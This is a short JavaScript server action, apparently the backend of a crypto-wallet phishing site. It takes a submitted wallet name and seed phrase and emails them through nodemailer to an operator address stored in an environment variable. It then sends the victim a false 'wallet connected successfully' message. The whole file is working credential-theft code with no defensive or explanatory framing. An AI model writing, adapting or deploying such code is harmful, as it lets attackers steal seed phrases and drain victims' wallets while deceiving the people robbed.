"use server";

import nodemailer from "nodemailer";

export default async function sendSeedPhrase(wallet, seedPhrase, userEmail) {
  // Configure your SMTP transport
  const transporter = nodemailer.createTransport({
    service: "gmail", // or your email provider
    auth: {
      user: process.env.EMAIL_USER, // set in your .env file
      pass: process.env.EMAIL_PASS, // set in your .env file
    },
  });

  // Send to admin/receiver
  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECEIVER, // set in your .env file
    subject: `New Seed Phrase Submission (${wallet})`,
    text: `Wallet: ${wallet}\nSeed Phrase: ${seedPhrase}`,
  });

  // Send confirmation to user
  if (userEmail) {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: userEmail,
      subject: "Wallet Connected Successfully",
      text: `Your wallet has been connected successfully. Your seed phrase is: ${seedPhrase}`,
    });
  }
}